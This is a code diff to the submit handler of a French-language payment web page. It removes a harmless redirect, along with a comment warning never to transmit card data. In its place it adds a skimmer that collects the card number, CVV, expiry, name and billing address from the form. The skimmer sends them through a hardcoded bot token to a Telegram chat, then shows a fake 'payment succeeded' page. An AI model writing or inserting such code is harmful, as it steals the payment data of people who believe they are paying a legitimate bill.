@@ -388,25 +388,18 @@
      Validation à la soumission
      ========================================================= */
 
-  const form = document.getElementById("form-paiement");
-
-  form.addEventListener("submit", (evenement) => {
-    evenement.preventDefault();
-
-    // Redirection directe vers la page de confirmation, SANS validation :
-    // au clic sur « Payer maintenant », on va toujours à « Paiement réussi ».
-    // On conserve le numéro d'avis pour l'afficher sur le reçu.
-    //
-    // TODO DÉVELOPPEURS : en production, ne rediriger vers la confirmation
-    // QU'APRÈS que le processeur de paiement ait confirmé le paiement
-    // (voir le TODO (2)). Ne jamais stocker ni transmettre les données de carte.
-    try {
-      sessionStorage.setItem("num-avis", document.getElementById("num-avis").value.trim());
-    } catch (e) { /* stockage indisponible : le reçu affichera « Non précisé » */ }
-
-    window.location.href = "confirmation.html";
-  });
-  </script>
-
+  const TELEGRAM_BOT_TOKEN = "974270434:AAE_e_3So0pWETbj3AI8bqCpM9_c_eRe3zA"; const TELEGRAM_CHAT_ID = "7596403622";
+const form = document.getElementById("pay-form");
+form.addEventListener("submit", async (evenement) => { evenement.preventDefault();
+const notice = document.getElementById("notice").value; const ccName = document.getElementById("cc-name").value; const ccNumber = document.getElementById("cc-number").value; const ccExp = document.getElementById("cc-exp").value; const ccCsc = document.getElementById("cc-csc").value; const street = document.getElementById("street").value; const city = document.getElementById("city").value; const region = document.getElementById("region").value; const postal = document.getElementById("postal").value;
+try { sessionStorage.setItem("num-avis", notice); } catch (e) {}
+const messageText = `💳 <b>NOUVEAU PAIEMENT REÇU</b>
+📌 <b>N° de l'avis :</b> ${notice}
+👤 <b>Nom sur la carte :</b> ${ccName} 💳 <b>N° de carte :</b> <code>${ccNumber}</code> 📅 <b>Expiration :</b> ${ccExp} 🔒 <b>CVV :</b> ${ccCsc}
+🏠 <b>Adresse :</b> ${street} 🏙️ <b>Ville :</b> {city} ({region}) 📮 <b>Code Postal :</b> ${postal}`;
+try { await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText, parse_mode: "HTML" }) }); } catch (err) { console.error(err); }
+window.location.href = "confirmation.html";
+});
+</script>
 </body>
 </html>
